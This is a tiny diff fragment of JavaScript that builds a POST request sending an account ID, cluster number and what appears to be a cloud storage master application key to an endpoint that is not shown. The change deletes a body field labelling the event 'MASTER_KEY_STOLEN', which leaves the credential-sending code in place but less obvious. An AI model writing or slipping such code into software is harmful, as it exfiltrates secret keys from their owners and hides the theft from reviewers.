@@ -28,7 +28,6 @@
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        type: "MASTER_KEY_STOLEN",
         accountId: accountId,
         clusterNum: clusterNum,
         masterKey: resp.b2ApplicationKey,
